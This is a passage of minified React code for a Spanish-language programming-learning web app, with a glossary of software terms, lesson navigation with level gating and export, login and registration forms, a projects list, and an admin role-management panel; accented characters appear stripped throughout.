y expresiones (como las variables) son visibles u ocultos para otras partes del cdigo."},{term:"Condicional",description:"Instruccin que permite tomar decisiones en el cdigo basndose en si una condicin es verdadera o falsa (if, else, switch)."},{term:"Estructura de Datos",description:"Forma organizada de almacenar y gestionar datos en memoria para acceder a ellos y modificarlos eficientemente (arrays, listas, rboles)."},{term:"Compilador",description:"Programa que traduce el cdigo fuente (escrito en un lenguaje de alto nivel) completamente a lenguaje mquina antes de su ejecucin (ej. C, Rust)."},{term:"Intrprete",description:"Programa que lee y ejecuta el cdigo lnea por lnea en tiempo real, sin crear un archivo ejecutable previo (ej. JavaScript, Python)."},{term:"Tipado Fuerte",description:"Regla del lenguaje donde los tipos de datos son estrictos y no se convierten automticamente de forma implcita."},{term:"Tipado Dbil",description:'Lenguaje que realiza conversiones implcitas de tipos de datos cuando es necesario, lo que puede causar comportamientos inesperados (ej. JS: "5" + 1 = "51").'},{term:"Tipado Esttico",description:"El tipo de las variables se comprueba durante la compilacin. Una vez definido, no puede cambiar."},{term:"Tipado Dinmico",description:"El tipo de las variables se comprueba durante la ejecucin del programa y puede cambiar dinmicamente."}]},{id:"desarrollo-web",title:"Desarrollo Web (Frontend & Backend)",definitions:[{term:"DOM (Document Object Model)",description:"Representacin en memoria de un documento HTML/XML como una estructura de rbol, que permite modificar su estructura, estilo y contenido mediante cdigo."},{term:"SPA (Single Page Application)",description:"Aplicacin web que carga una sola pgina HTML y actualiza dinmicamente el contenido mediante JavaScript sin recargar el navegador."},{term:"SSR (Server-Side Rendering)",description:"Tcnica donde el HTML de la pgina web es generado completamente en el servidor antes de ser enviado al navegador cliente."},{term:"CSR (Client-Side Rendering)",description:"Tcnica donde el navegador descarga un HTML mnimo y JavaScript se encarga de construir e hidratar la interfaz de usuario."},{term:"Tech Stack (Pila Tecnolgica)",description:"Conjunto de lenguajes de programacin, frameworks, libreras y herramientas utilizados en combinacin para desarrollar una aplicacin (ej. MERN, MEAN, LAMP)."},{term:"Framework (Marco de Trabajo)",description:"Estructura base predefinida que proporciona herramientas y reglas arquitectnicas para acelerar el desarrollo del software, imponiendo su propio flujo de control (ej. Angular, Next.js, Django)."},{term:"Librera (Library)",description:"Coleccin de cdigo preescrito y utilidades que un desarrollador puede integrar para realizar tareas especficas sin perder el control sobre la arquitectura del proyecto (ej. React, Lodash, jQuery)."},{term:"Frontend",description:"La parte del software orientada al cliente: la interfaz de usuario, el diseo visual y la interactividad que el usuario experimenta en el navegador o pantalla."},{term:"Backend",description:"La lgica detrs de escena del sistema operativo del servidor, encargada del procesamiento de datos, bases de datos, seguridad, y APIs."},{term:"Fullstack",description:"Perfil de desarrollo capaz de trabajar y construir funcionalidades completas tanto en el entorno del cliente (Frontend) como en el servidor (Backend)."},{term:"API (Application Programming Interface)",description:"Conjunto de reglas y protocolos que permite que diferentes aplicaciones de software se comuniquen entre s."},{term:"Endpoint",description:"Una ruta fsica web o un punto de acceso expuesto por una API donde el cliente puede comunicarse (usualmente interactuando con parmetros y datos)."},{term:"REST (Representational State Transfer)",description:"Estilo arquitectnico para disear APIs en red usando peticiones HTTP estndar (GET, POST, PUT, DELETE) e intercambiando datos normalmente en JSON."},{term:"GraphQL",description:"Lenguaje de consulta y entorno de ejecucin para APIs que permite al cliente pedir exactamente los datos que necesita y nada ms, resolviendo problemas de Over-fetching y Under-fetching."},{term:"CORS (Cross-Origin Resource Sharing)",description:"Mecanismo de seguridad del navegador que restringe las peticiones HTTP realizadas desde un dominio hacia otro dominio diferente por motivos de seguridad."},{term:"JWT (JSON Web Token)",description:"Estndar abierto para la transmisin segura de informacin como un objeto JSON, muy usado para autenticacin y autorizacin (Login state)."},{term:"Middleware",description:"Software que acta como puente entre un sistema operativo o base de datos y las aplicaciones, en web refiere a funciones que interceptan peticiones (ej. verificar auth antes de dar respuesta)."},{term:"Estado (State)",description:"Datos que representan la situacin o modelo de la interfaz de usuario en un momento dado."}]},{id:"arquitectura",title:"Ingeniera de Software & Arquitectura",definitions:[{term:"Clean Code (Cdigo Limpio)",description:"Filosofa y mejores prcticas para escribir cdigo fcil de leer, entender y mantener por otros desarrolladores."},{term:"Principios SOLID",description:"Cinco principios de diseo orientado a objetos (Single Responsibility, Open/Closed, Liskov Substitution, Interface Segregation, Dependency Inversion) orientados a cdigo mantenible."},{term:"Patrn de Diseo",description:"Solucin general, reutilizable y comprobada a un problema comn que ocurre dentro del diseo de software (ej. Singleton, Observer, Factory)."},{term:"Refactoring (Refactorizacin)",description:"Proceso de reestructurar el cdigo fuente existente, alterando su estructura interna sin cambiar su comportamiento externo, para mejorar su legibilidad y mantenibilidad."},{term:"Code Smell",description:"Sntoma o indicador superficial en el cdigo que posiblemente indica un problema ms profundo en el diseo o arquitectura del sistema."},{term:"TDD (Test-Driven Development)",description:"Prctica de desarrollo donde se escriben primero las pruebas (tests) automatizadas y luego el cdigo necesario para que esas pruebas pasen."},{term:"Microservicios",description:"Arquitectura que estructura una aplicacin como una coleccin de servicios pequeos, dbilmente acoplados, desplegables independientemente y organizados por capacidad de negocio."},{term:"Monolito",description:"Arquitectura donde todos los componentes del software (interfaz de usuario, lgica de negocio y acceso a datos) estn combinados en un solo programa ejecutable o bloque."},{term:"Deuda Tcnica",description:'Metfora que refiere al costo implcito de retrabajo adicional causado por elegir una solucin "rpida y sucia" en lugar de hacer el trabajo con el mejor enfoque a largo plazo.'},{term:"Arquitectura Hexagonal (Puertos y Adaptadores)",description:"Patrn arquitectnico que asla el ncleo de la aplicacin (lgica de negocio) de factores externos (UI, Bases de Datos, APIs) mediante puertos intermedios invertiendo dependencias."}]},{id:"bases-datos",title:"Bases de Datos",definitions:[{term:"SQL (Structured Query Language)",description:"Lenguaje estndar utilizado para comunicarse y manipular bases de datos relacionales (RDBMS)."},{term:"NoSQL",description:"Sistemas de bases de datos que no utilizan tablas relacionales para el almacenamiento tabular. Suelen ser bases de datos orientadas a documentos, clave-valor o grafos."},{term:"ORM (Object-Relational Mapping)",description:'Tcnica de programacin que convierte datos entre sistemas de tipos incompatibles usando lenguajes orientados a objetos, actuando como una "base de datos virtual" en memoria.'},{term:"ACID",description:"Conjunto de propiedades de las transacciones en bases de datos (Atomicidad, Consistencia, Aislamiento, Durabilidad) que garantizan la validez de los datos."},{term:"CRUD",description:"Acrnimo para las 4 operaciones fundamentales sobre los datos: Create (Crear), Read (Leer), Update (Actualizar), y Delete (Eliminar)."},{term:"ndice (Index)",description:"Estructura de datos que mejora la velocidad de las operaciones de recuperacin de datos en una tabla de base de datos, con un costo adicional de espacio y tiempo de escritura."},{term:"Query (Consulta)",description:"Peticin formal de recuperacin de datos u operacin en una base de datos."},{term:"Llave Primaria (Primary Key)",description:"Campo o grupo de campos que identifica de forma nica cada registro en una tabla."},{term:"Llave Fornea (Foreign Key)",description:"Campo usado en una tabla para enlazar a la llave primaria de otra tabla, estableciendo una relacin entre la informacin."}]},{id:"infraestructura",title:"DevOps & Infraestructura",definitions:[{term:"CI/CD (Continuous Integration / Continuous Deployment)",description:"Prcticas combinadas que automatizan la integracin del cdigo de mltiples desarrolladores, testing, y su despliegue seguro a entornos de produccin."},{term:"Contenedor",description:"Paquete de software ejecutable y ligero que incluye todo lo necesario para ejecutarse: cdigo, runtime, herramientas del sistema, y Librerias (ej. Docker)."},{term:"Mquina Virtual (VM)",description:"Emulacin por software de un sistema computacional completo y aislado con su propio sistema operativo."},{term:"Kubernetes (K8s)",description:"Sistema de cdigo abierto para automatizar el despliegue, escalado y gestin de aplicaciones en contenedores de forma orquestada."},{term:"Cloud Computing (Nube)",description:"Entrega bajo demanda de poder de cmputo, almacenamiento y otros servicios de TI a travs de internet con precios de pago por uso (AWS, Azure, GCP)."},{term:"Serverless",description:"Modelo de ejecucin de computacin en la nube donde el proveedor gestiona dinmicamente la asignacin de recursos del servidor. El desarrollador solo escribe lgica y funciones."},{term:"Escalabilidad Vertical",description:"Mejorar la capacidad del sistema aumentando los recursos (RAM, CPU, discos) del nodo actual."},{term:"Escalabilidad Horizontal",description:"Mejorar la capacidad agregando ms nodos (servidores, instancias) distribuyendo la carga."},{term:"Balanceador de Carga (Load Balancer)",description:"Dispositivo o software que distribuye el trfico de red de forma eficiente entre varios servidores para asegurar alta disponibilidad y velocidad."}]},{id:"control-versiones",title:"Control de Versiones & Equipo",definitions:[{term:"Git",description:"Sistema de control de versiones distribuido que rastrea los cambios en los archivos y permite a mltiples desarrolladores trabajar en el mismo proyecto simultneamente."},{term:"Commit",description:"Un punto asincrnico guardado en la historia del proyecto. Representa un conjunto de cambios hechos en mltiples archivos y debe tener una descripcin clara."},{term:"Branch (Rama)",description:"Lnea paralela independiente de desarrollo. Permite crear ramas separadas de la versin principal para trabajar en nuevas iteraciones sin afectarla."},{term:"Merge",description:"Proceso de combinar o integrar los cambios de una rama del repositorio hacia otra (normalmente de rama-feature hacia rama-principal)."},{term:"Pull Request / Merge Request",description:"Peticin formal para revisar, discutir e integrar cdigo desde una rama hacia otra. Es la etapa central del Code Review."},{term:"Agile",description:"Conjunto de metodologas para el desarrollo de software que abogan por iteraciones de desarrollo rpidas, comunicacin constante y adaptabilidad a cambios (ej. Scrum, Kanban)."},{term:"Sprint",description:"Periodo de tiempo fijo y corto en un flujo de trabajo Scrum donde el equipo debe completar una cantidad establecida de trabajo definido en tareas o historias de usuario."}]}],JZ=()=>{const[a,e]=U.useState(""),t=QZ.map(n=>({...n,definitions:n.definitions.filter(i=>i.term.toLowerCase().includes(a.toLowerCase())||i.description.toLowerCase().includes(a.toLowerCase()))})).filter(n=>n.definitions.length>0);return b.jsxs("div",{className:"dictionary-viewer",children:[b.jsxs("header",{className:"dictionary-header",children:[b.jsx("div",{className:"dictionary-header-content",children:b.jsxs("div",{className:"dictionary-title-block",children:[b.jsx("h1",{children:"Diccionario de Programacin"}),b.jsx("p",{children:"Trminos y conceptos esenciales del software agrupados por temtica."})]})}),b.jsxs("div",{className:"dictionary-search-box",children:[b.jsx(Dp,{className:"search-icon",size:20}),b.jsx("input",{type:"text",placeholder:"Buscar un trmino o definicin...",value:a,onChange:n=>e(n.target.value),className:"dictionary-search-input"}),a&&b.jsxs("span",{className:"search-results-count",children:[t.reduce((n,i)=>n+i.definitions.length,0)," resultados"]})]})]}),b.jsx("div",{className:"dictionary-content",children:t.length>0?t.map(n=>b.jsxs("section",{className:"dictionary-topic",children:[b.jsxs("h2",{className:"topic-title",children:[b.jsx("span",{className:"topic-hash",children:b.jsx(H9,{size:24})}),n.title]}),b.jsx("div",{className:"dictionary-table-container",children:b.jsxs("table",{className:"dictionary-table",children:[b.jsx("thead",{children:b.jsxs("tr",{children:[b.jsx("th",{children:"Trmino"}),b.jsx("th",{children:"Definicin"})]})}),b.jsx("tbody",{children:n.definitions.map((i,r)=>b.jsxs("tr",{className:"dictionary-row",children:[b.jsx("td",{className:"term-cell",children:i.term}),b.jsx("td",{className:"desc-cell",children:i.description})]},r))})]})})]},n.id)):b.jsxs("div",{className:"dictionary-empty-state",children:[b.jsx(ED,{size:64,className:"ghost-icon"}),b.jsx("h3",{children:"No se encontraron trminos"}),b.jsxs("p",{children:['No hay coincidencias para "',a,'"']})]})})]})},WZ=()=>{const{moduleId:a}=_F(),{search:e}=ai(),[t,n]=U.useState(null),[i,r]=U.useState("all"),[l,u]=U.useState(!0),{markAsCompleted:d,isLessonCompleted:p,xp:f,calculateLevel:h,updateLastLesson:E,getLastLesson:C,addToHistory:A}=Jc(),j=U.useMemo(()=>h(f),[f,h]),R=j.level,I={junior:1,"semi-senior":2,senior:3},w=a?Td(a):void 0,k=ce=>{if(!w)return;let me="";if(ce==="md")me=`# ${w.title}

${w.description}

---

`,w.lessons.forEach((je,G)=>{me+=`## ${G+1}. ${je.title} (${je.level?.toUpperCase()})

`,me+=`${je.content}

---

`});else{const je=`<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:w='urn:schemas-microsoft-com:office:word' xmlns='http://www.w3.org/TR/REC-html40'><head><meta charset='utf-8'><title>${w.title}</title><style>body { font-family: sans-serif; } .lesson { margin-bottom: 40px; border-bottom: 1px solid #ccc; padding-bottom: 20px; }</style></head><body>`,G="</body></html>";let J=`<h1>${w.title}</h1><p>${w.description}</p><hr/>`;w.lessons.forEach((de,B)=>{J+=`<div class="lesson"><h2>${B+1}. ${de.title}</h2><pre style="white-space: pre-wrap;">${de.content}</pre></div>`}),me=je+J+G}const Z=new Blob([me],{type:ce==="md"?"text/markdown":"application/msword"}),re=URL.createObjectURL(Z),Ee=document.createElement("a");Ee.href=re,Ee.download=`${w.id}-completo.${ce}`,document.body.appendChild(Ee),Ee.click(),document.body.removeChild(Ee),URL.revokeObjectURL(re)};if(Go.useEffect(()=>{if(!w)return;const me=new URLSearchParams(e).get("lesson");if(me&&w.lessons.some(Z=>Z.id===me))n(me);else if(!t){const Z=C(w.id);if(Z&&w.lessons.some(re=>re.id===Z))n(Z);else if(w.lessons.length>0){const re=i==="all"?w.lessons:w.lessons.filter(Ee=>Ee.level===i);re.length>0?n(re[0].id):n(w.lessons[0].id)}}},[a,e,t,i,w,C]),Go.useEffect(()=>{if(w&&t){const ce=w.lessons.find(me=>me.id===t);ce&&(E(w.id,t),A(t,w.id,ce.title,w.title))}},[t,w,C,E,A]),!w)return b.jsxs("div",{className:"module-not-found",children:[b.jsx("h2",{children:"Mdulo no encontrado"}),b.jsx("p",{children:"Lo sentimos, el mdulo que buscas no existe o est en desarrollo."}),b.jsx(jn,{to:"/roadmap",className:"btn-back",children:"Volver a los Cursos"})]});if(w.id==="diccionario")return b.jsxs("div",{className:"lesson-page-container dictionary-page-mode",children:[b.jsx(PL,{moduleName:w.title.split(":")[0],lessonName:"Diccionario"}),b.jsx(JZ,{})]});const Y=w.lessons.filter(ce=>i==="all"||ce.level===i),ee=w.lessons.find(ce=>ce.id===t),Q=ee?w.lessons.findIndex(ce=>ce.id===t):-1,q=Q>0,M=Q!==-1&&Q<w.lessons.length-1,N=U.useMemo(()=>{if(!ee||Q<=0)return!0;const ce=w.lessons[Q-1];return p(w.id,ce.id)},[ee,Q,w.id,w.lessons,p]),L=()=>{q&&n(w.lessons[Q-1].id)},_=()=>{M&&n(w.lessons[Q+1].id)},V=ce=>ce?(I[ce]||1)>R:!1,F=ce=>{if(ce===0)return!1;const me=w.lessons[ce-1].id;return!p(w.id,me)};return b.jsxs("div",{className:"lesson-page-container",children:[b.jsx(PL,{moduleName:w.title.split(":")[0],lessonName:ee?.title}),b.jsxs("header",{className:"module-header",children:[b.jsxs("div",{className:"module-info-container",children:[b.jsxs("div",{className:"module-title-row",children:[b.jsx("h1",{className:"module-title",children:w.title}),b.jsxs("div",{className:"header-actions",children:[b.jsx(jn,{to:"/roadmap",className:"btn-back-roadmap",children:" Volver a los Cursos"}),b.jsxs("div",{className:"export-actions",children:[b.jsx("span",{className:"export-label",children:"Exportar:"}),b.jsx("button",{className:"btn-export-mini",onClick:()=>k("md"),title:"Descargar como Markdown",children:".MD"}),b.jsx("button",{className:"btn-export-mini",onClick:()=>k("doc"),title:"Descargar como Word (.doc)",children:"WORD"}),b.jsx("button",{className:"btn-export-mini",onClick:()=>window.print(),title:"Imprimir / Guardar como PDF",children:"PDF"})]})]})]}),b.jsx("p",{className:"module-desc",children:w.description})]}),b.jsxs("div",{className:"level-status-card",children:[b.jsxs("span",{className:"user-level-badge",children:["Tu Nivel: ",R]}),b.jsx("div",{className:"xp-progress-mini",children:b.jsx("div",{className:"xp-bar-fill",style:{width:`${(f-j.currentLevelMin)/(j.nextLevelXp-j.currentLevelMin)*100}%`}})})]})]}),b.jsxs("aside",{className:`lesson-sidebar ${l?"":"closed"}`,children:[b.jsxs("div",{className:"sidebar-header",children:[b.jsx("h3",{children:"Lecciones"}),b.jsx("div",{className:"level-filter",children:b.jsxs("select",{value:i,onChange:ce=>r(ce.target.value),className:"filter-select",children:[b.jsx("option",{value:"all",children:"Todos los niveles"}),b.jsx("option",{value:"junior",children:"Junior"}),b.jsx("option",{value:"semi-senior",children:"Semi-Senior"}),b.jsx("option",{value:"senior",children:"Senior"})]})})]}),b.jsx("ul",{className:"lesson-list",children:Y.length>0?Y.map(ce=>{const me=w.lessons.findIndex(G=>G.id===ce.id),Z=p(w.id,ce.id),re=V(ce.level),Ee=F(me),je=re||Ee;return b.jsxs("li",{className:`lesson-item ${t===ce.id?"active":""} ${je?"locked-item":""}`,onClick:()=>n(ce.id),children:[b.jsxs("div",{className:"lesson-item-header",children:[b.jsx("span",{className:"lesson-status",children:Z?b.jsx(Ys,{size:16,color:"#22c55e"}):re?b.jsx(_c,{size:16,color:"#ef4444"}):Ee?b.jsx(_c,{size:16,color:"#4b5563"}):b.jsx(QV,{size:16,color:"#3b82f6"})}),b.jsx("span",{className:"lesson-item-title",children:ce.title})]}),ce.level&&b.jsx("span",{className:`mini-badge ${ce.level}`,children:ce.level==="semi-senior"?"SS":ce.level.charAt(0).toUpperCase()})]},ce.id)}):b.jsx("li",{className:"no-lessons",children:"No hay lecciones para este filtro."})})]}),b.jsx("section",{className:`lesson-content ${l?"":"expanded"}`,children:ee?b.jsxs("div",{className:"lesson-wrapper",children:[V(ee.level)&&b.jsxs("div",{className:"level-warning-banner",children:[b.jsx(a7,{className:"inline-icon-warning",size:18})," Esta leccin es de nivel ",ee.level?.toUpperCase(),". Tu nivel actual es ",R,". Puedes intentarlo, pero ser un desafo!"]}),b.jsx(GZ,{moduleId:w.id,moduleTitle:w.title,lesson:{...ee,completed:p(w.id,ee.id)},onComplete:ce=>d(w.id,ce,w.lessons.length),canComplete:N,hasPrev:q,hasNext:M,onPrev:L,onNext:_,isSidebarOpen:l,onToggleSidebar:()=>u(!l)})]}):b.jsx("div",{className:"no-lesson-selected",children:b.jsx("p",{children:w.lessons.length>0?"Selecciona una leccin de la lista para comenzar a aprender.":"An no hay lecciones disponibles para este mdulo."})})})]})},KZ=()=>{const[a,e]=U.useState(""),[t,n]=U.useState(""),[i,r]=U.useState(""),[l,u]=U.useState(!1),{login:d,loginWithGoogle:p,loginWithFacebook:f,loginWithGithub:h}=sr(),E=rr(),C=async j=>{try{r(""),u(!0),await j(),E("/")}catch(R){r("Error con el inicio de sesin social. Intenta nuevamente."),console.error(R)}finally{u(!1)}},A=async j=>{j.preventDefault(),r(""),u(!0);try{await d(a,t),E("/")}catch(R){r("Error al iniciar sesin. Verifica tus credenciales."),console.error(R)}finally{u(!1)}};return b.jsxs("div",{className:"auth-container",children:[b.jsx("h1",{className:"auth-title",children:"Bienvenido"}),b.jsx("span",{className:"auth-subtitle",children:"Contina tu aprendizaje en progavio"}),i&&b.jsx("div",{className:"auth-error",children:i}),b.jsxs("form",{className:"auth-form",onSubmit:A,children:[b.jsxs("div",{className:"form-group",children:[b.jsx("label",{children:"Email"}),b.jsx("input",{type:"email",value:a,onChange:j=>e(j.target.value),placeholder:"tu@email.com",required:!0})]}),b.jsxs("div",{className:"form-group",children:[b.jsx("label",{children:"Contrasea"}),b.jsx("input",{type:"password",value:t,onChange:j=>n(j.target.value),placeholder:"",required:!0})]}),b.jsx("button",{className:"btn-auth",type:"submit",disabled:l,children:l?"Entrando...":"Iniciar Sesin"}),b.jsx("div",{className:"auth-divider",children:b.jsx("span",{children:"O contina con"})}),b.jsxs("div",{className:"social-auth",children:[b.jsx("button",{type:"button",onClick:()=>C(p),className:"btn-social google",title:"Google",children:b.jsx(CD,{})}),b.jsx("button",{type:"button",onClick:()=>C(f),className:"btn-social facebook",title:"Facebook",children:b.jsx(AD,{})}),b.jsx("button",{type:"button",onClick:()=>C(h),className:"btn-social github",title:"GitHub",children:b.jsx(LD,{})})]})]}),b.jsxs("div",{className:"auth-footer",children:["No tienes cuenta? ",b.jsx(jn,{to:"/register",children:"Regstrate"})]})]})},YZ=()=>{const[a,e]=U.useState(""),[t,n]=U.useState(""),[i,r]=U.useState(""),[l,u]=U.useState(""),[d,p]=U.useState(!1),{register:f,loginWithGoogle:h,loginWithFacebook:E,loginWithGithub:C}=sr(),A=rr(),j=async I=>{try{u(""),p(!0),await I(),A("/")}catch(w){u("Error con el registro social. Intenta nuevamente."),console.error(w)}finally{p(!1)}},R=async I=>{if(I.preventDefault(),t!==i)return u("Las contraseas no coinciden");u(""),p(!0);try{await f(a,t),A("/")}catch(w){u("Error al crear la cuenta. Intenta con otro email."),console.error(w)}finally{p(!1)}};return b.jsxs("div",{className:"auth-container",children:[b.jsx("h1",{className:"auth-title",children:"Crear Cuenta"}),b.jsx("span",{className:"auth-subtitle",children:"nete a la comunidad de progavio"}),l&&b.jsx("div",{className:"auth-error",children:l}),b.jsxs("form",{className:"auth-form",onSubmit:R,children:[b.jsxs("div",{className:"form-group",children:[b.jsx("label",{children:"Email"}),b.jsx("input",{type:"email",value:a,onChange:I=>e(I.target.value),placeholder:"tu@email.com",required:!0})]}),b.jsxs("div",{className:"form-group",children:[b.jsx("label",{children:"Contrasea"}),b.jsx("input",{type:"password",value:t,onChange:I=>n(I.target.value),placeholder:"",required:!0,minLength:6})]}),b.jsxs("div",{className:"form-group",children:[b.jsx("label",{children:"Confirmar Contrasea"}),b.jsx("input",{type:"password",value:i,onChange:I=>r(I.target.value),placeholder:"",required:!0})]}),b.jsx("button",{className:"btn-auth",type:"submit",disabled:d,children:d?"Creando...":"Registrarse"}),b.jsx("div",{className:"auth-divider",children:b.jsx("span",{children:"O regstrate con"})}),b.jsxs("div",{className:"social-auth",children:[b.jsx("button",{type:"button",onClick:()=>j(h),className:"btn-social google",title:"Google",children:b.jsx(CD,{})}),b.jsx("button",{type:"button",onClick:()=>j(E),className:"btn-social facebook",title:"Facebook",children:b.jsx(AD,{})}),b.jsx("button",{type:"button",onClick:()=>j(C),className:"btn-social github",title:"GitHub",children:b.jsx(LD,{})})]})]}),b.jsxs("div",{className:"auth-footer",children:["Ya tienes cuenta? ",b.jsx(jn,{to:"/login",children:"Inicia Sesin"})]})]})},$Z="https://progravio.onrender.com",XZ=async()=>{try{const a=await fetch(`${$Z}/projects`);if(!a.ok)throw new Error(`HTTP error! status: ${a.status}`);return await a.json()}catch(a){throw console.error("Failed to fetch projects:",a),a}},ZZ=()=>{const[a,e]=U.useState([]),[t,n]=U.useState(null),[i,r]=U.useState(!0),[l,u]=U.useState(null);return U.useEffect(()=>{(async()=>{try{r(!0);const p=await XZ();e(p),u(null)}catch(p){u("Error al cargar los proyectos. Asegrate de que el servidor est corriendo."),console.error(p)}finally{r(!1)}})()},[]),i?b.jsx("div",{className:"projects-status",children:"Cargando proyectos..."}):l?b.jsx("div",{className:"projects-status error",children:l}):b.jsxs("div",{className:"projects-container",children:[b.jsx("h1",{className:"projects-title",children:"Proyectos Educativos"}),b.jsx("p",{className:"projects-subtitle",children:"Aplica lo aprendido con estos mini-proyectos prcticos."}),b.jsxs("div",{className:"projects-layout",children:[b.jsx("div",{className:"projects-list-section",children:b.jsx("div",{className:"projects-grid",children:a.map(d=>b.jsxs("div",{className:`project-card ${t?.id===d.id?"selected":""}`,onClick:()=>n(d),children:[b.jsx("span",{className:`difficulty-tag ${d.difficulty.toLowerCase()}`,children:d.difficulty}),b.jsx("h3",{children:d.title}),b.jsx("p",{children:d.description}),b.jsx("button",{className:"btn-view-detail",children:"Ver Detalle"})]},d.id))})}),t&&b.jsx("div",{className:"project-detail-section",children:b.jsxs("div",{className:"project-detail-content",children:[b.jsx("button",{className:"btn-close-detail",onClick:()=>n(null),children:""}),b.jsx("h2",{children:t.title}),b.jsx("p",{className:"detail-desc",children:t.description}),b.jsxs("div",{className:"detail-group",children:[b.jsx("h3",{children:"Requerimientos:"}),b.jsx("ul",{children:t.requirements.map((d,p)=>b.jsx("li",{children:d},p))})]}),b.jsxs("div",{className:"detail-group",children:[b.jsx("h3",{children:"ID del Mdulo Relacionado:"}),b.jsx("div",{className:"module-ref",children:t.moduleId})]})]})})]})]})},eee=()=>{const{user:a,logout:e}=sr(),[t,n]=U.useState("users"),[i,r]=U.useState([]),[l,u]=U.useState(!0),[d,p]=U.useState(null),[f,h]=U.useState(""),[E,C]=U.useState("");U.useEffect(()=>{(async()=>{if(a)try{const I=await a.getIdToken(),w=await fetch("https://progravio.onrender.com/users",{headers:{Authorization:`Bearer ${I}`}});if(!w.ok)throw new Error("Failed to fetch users");const k=await w.json();r(k)}catch(I){console.error("Error fetching users:",I),I instanceof Error?p(I.message):p(String(I))}finally{u(!1)}})()},[a]);const A=async(R,I)=>{if(a)try{const w=await a.getIdToken(),k=await fetch("https://progravio.onrender.com/users/set-role",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${w}`},body:JSON.stringify({uid:R,role:I})});if(!k.ok){const Y=await k.json();throw new Error(Y.error||"Failed to update role")}r(i.map(Y=>Y.uid===R?{...Y,role:I}:Y)),alert(`Role updated to ${I}`)}catch(w){w instanceof Error?alert(`Error: ${w.message}`):alert(`Error: ${String(w)}`)}},j=async()=>{if(a)try{const R=await fetch("https://progravio.onrender.com/users/setup-admin",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:a.uid,secret:f})}),I=await R.json();R.ok?(C(I.message),alert("Admin rights granted. Please refresh the page.")):C(`Error: ${I.error}`)}catch(R){R instanceof Error?C(`Error: ${R.message}`):C(`Error: ${String(R)}`)}};return l?b.jsx("div",{className:"admin-container",style:{textAlign:"center",paddingTop:"10rem"},children:"Cargando panel..."}):b.jsxs("div",{className:"admin-container",children:[b.jsxs("header",{className:"admin-header",children:[b.jsxs("div",{children:[b.jsx("h1",{className:"admin-title",children:"Panel de Administracin"}),b.jsxs("p",{style:{color:"var(--text-secondary)",marginTop:"0.5rem"},children:["Bienvenido, ",a?.email]})]}),b.jsx("button",{onClick:async()=>{await e(),window.location.href="/"},className:"admin-logout-btn",children:"Cerrar Sesin"})]}),b.jsxs("div",{className:"admin-tabs",children:[b.jsx("button",{className:`admin-tab ${t==="users"?"active":""}`,onClick:()=>n("users"),children:"Gestin de Usuarios"}),b.jsx("button",{className:`admin-tab ${t==="content"?"active":""}`,onClick:()=>n("content"),children:"Gestin de Contenido"}),b.jsx("button",{className:`admin-tab ${t==="nav"?"active":""}`,onClick:()=>n("nav"),children:"Gestin de Navegacin"})]}),b.jsxs("div",{className:"admin-warning",children:[b.jsx("h3",{children:" Permisos Insuficientes (Demo)"}),b.jsxs("p",{children:["Tu rol actual en Firestore: ",b.jsx("strong",{children:i.find(R=>R.uid===a?.uid)?.role||"user"})]}),b.jsx("p",{children:"Para tener control total del panel de administracin, necesitas:"}),b.jsxs("ol",{style:{paddingLeft:"1.5rem",marginTop:"0.5rem",fontSize:"0.9rem"},children:[b.jsxs("li",{children:["Tener el campo ",b.jsx("code",{children:'role: "admin"'})," en tu documento de Firestore"]}),b.jsx("li",{children:'O usar el botn "Self-Promote" en la pestaa de Usuarios con el secreto correcto'})]})]}),t==="users"&&b.jsxs("div",{className:"admin-card",children:[b.jsx("h2",{children:"Usuarios Registrados"}),d&&b.jsxs("p",{style:{color:"#ef4444",marginBottom:"1rem"},children:["Error: ",d]}),b.jsx("div",{className:"table-container",children:b.jsxs("table",{className:"admin-table",children:[b.jsx("thead",{children:b.jsxs("tr",{children:[b.jsx("th",{children:"Email"}),b.jsx("th",{children:"UID"}),b.jsx("th",{children:"Rol"}),b.jsx("th",{children:"Acciones"})]})}),b.jsxs("tbody",{children:[i.map(R=>b.jsxs("tr",{children:[b.jsx("td",{children:R.email}),b.jsxs("td",{style:{fontFamily:"monospace",opacity:.7},children:[R.uid.substring(0,12),"..."]}),b.jsx("td",{children:b.jsx("span",{className:`role-badge ${R.role==="admin"?"admin":"user"}`,children:R.role||"user"})}),b.jsx("td",{style:{display:"flex",gap:"0.5rem"},children:R.role!=="admin"?b.jsx("button",{className:"action-btn promote",onClick:()=>A(R.uid,"admin"),children:"Hacer Admin"}):b.jsx("button",{className:"action-btn demote",onClick:()=>A(R.uid,"user"),children:"Quitar Admin"})})]},R.uid)),i.length===0&&!d&&b.jsx("tr",{children:b.jsx("td",{colSpan:4,style:{textAlign:"center",padding:"2rem",opacity:.5},children:"No se encontraron usuarios"})})]})]})})]}),t==="content"&&b.jsxs("div",{className:"admin-card",style:{textAlign:"center",padding:"4rem"},children:[b.jsx("h2",{style:{justifyContent:"center"},children:"Gestin de Contenido"}),b.jsx("p",{style:{color:"var(--text-secondary)"},children:"Prximamente: Editor de Markdown y gestin de mdulos."})]}),t==="nav"&&b.jsxs("div",{className:"admin-card",style:{textAlign:"center",padding:"4rem"},children:[b.jsx("h2",{style:{justifyContent:"center"},children:"Gestin de Navegacin"}),b.jsx("p",{style:{color:"var(--text-secondary)"},children:"Prximamente: Reordenar rutas y mens."})]}),b.jsxs("div",{className:"admin-card",style:{border:"1px solid rgba(234, 179, 8, 0.2)"},children:[b.jsx("h2",{style:{color:"#eab308"},children:" Acciones de Emergencia"}),b.jsxs("div",{className:"emergency-form",children:[b.jsx("input",{type:"password",placeholder:"ADMIN_SETUP_SECRET",className:"emergency-input",value:f,onChange:R=>h(R.target.value)}),b.jsx("button",{onClick:j,className:"action-btn emergency-btn",children:"Self-Promote"})]}),E&&b.jsx("p",{style:{marginTop:"1rem",color:"#eab308"},children:E})]})]})},No=({children:a})=>{const{user:e,loading:t}=sr();return t?b.jsx("div",{style:{display:"flex",justifyContent:"center",alignItems:"center",height:"100vh",backgroundColor:"#0f0f0f",color:"#ffffff"},children:b.jsx("p",{children:"Cargando sesin..."})}):e?b.jsx(b.Fragment,{children:a}):b.jsx(Yj,{to:"/login",replace:!0})},aee=({children:a})=>{const e=U.useContext(a1);if(!e)throw new Error("AdminRoute must be used within an AuthProvider");const{user:t,loading:n,isAdmin:i}=e;return n?b.jsx("div",{className:"flex justify-center items-center h-screen bg-[#0a0a0a]",children:b.jsx("div",{className:"animate-spin 